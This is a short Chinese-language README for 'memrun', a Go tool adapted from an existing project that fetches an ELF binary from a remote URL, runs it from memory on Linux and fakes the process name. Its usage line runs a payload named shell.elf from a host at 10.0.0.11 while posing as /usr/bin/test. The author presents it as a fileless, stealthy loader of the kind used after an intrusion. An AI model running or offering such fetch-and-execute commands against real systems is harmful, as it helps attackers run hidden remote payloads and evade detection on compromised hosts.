# memrun
一直想找一个linux远程内存加载elf的工具，发现了这个项目，但是进程很明显：https://github.com/seventeenman/noELF

又找到一个go语言开发的可以伪造进程名的，简单修改了一下大佬的项目：https://github.com/guitmz/memrun

## 使用方法
```bash
go build memrun.go
./memrun /usr/bin/test http://10.0.0.11:9090/shell.elf
```
